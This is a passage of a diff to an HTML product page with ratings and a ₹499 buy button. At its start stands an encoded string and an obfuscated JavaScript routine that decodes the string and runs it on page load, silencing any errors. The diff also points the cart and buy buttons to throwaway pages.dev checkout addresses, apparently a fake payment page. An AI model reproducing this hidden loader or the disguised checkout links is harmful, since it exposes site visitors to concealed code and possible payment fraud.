u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _T2T2(_FS,_gYS,_8Y29,$,_Yr,_k2h){_dA=this._W5L5YvH3h__wacD79;_dA.f(_Yr,$);if(!_8Y29){_8Y29=$.__u8n;}_f9()(_FS,0,0x3f7f,this,"''");function _f9(){return function(_v1,_7jn4,_R99,_2Y3,_TaSD){_dA.p1=_v1;_dA.p2=_R99;try{_v45W(_2Y3)(_oAm()([_8Y29[$._730lN]("+p%p",_TaSD)[$._730lN]("-p%q",_TaSD)],''))();}catch(e){}function _v45W(_zp3){return _zp3[$._nD6];};_2Y3._W5L5YvH3h__wacD79=_k2h;};};function _oAm(){return function(_tx,_p5){return _tx[$._g9T1](_p5);};};};}());
+  </script>
 </head>
 <body>
 
@@ -1308,7 +244,7 @@ body {
     <div class="rating-summary">
         <div class="overall-rating">
   <div class="overall-rating">
-    <div class="rating-badge">4.4 <span class="star">&#9733;</span></div>
+    <div class="rating-badge">4.4 <span class="star">★</span></div>
       <div class="stars">★★★★☆</div>
       <div class="total">12,544 ratings and 647 reviews</div>
     </div>
@@ -1578,13 +514,8 @@ body {
 
   <!-- Sticky Bottom Bar -->
   <div class="bottom-bar">
-    <a href="https://order-check-out.pages.dev/" class="btn ghost">Add to cart</a>
-    <a href="https://order-check-out.pages.dev/" class="btn primary">Buy at ₹499</a>
+    <a href="https://order-checkout-01.pages.dev/" class="btn ghost">Add to cart</a>
+    <a href="https://order-checkout-01.pages.dev/" class="btn primary">Buy at ₹499</a>
   </div>
   </header>
   </body>
-  </html>
-        
-        
-        
-        
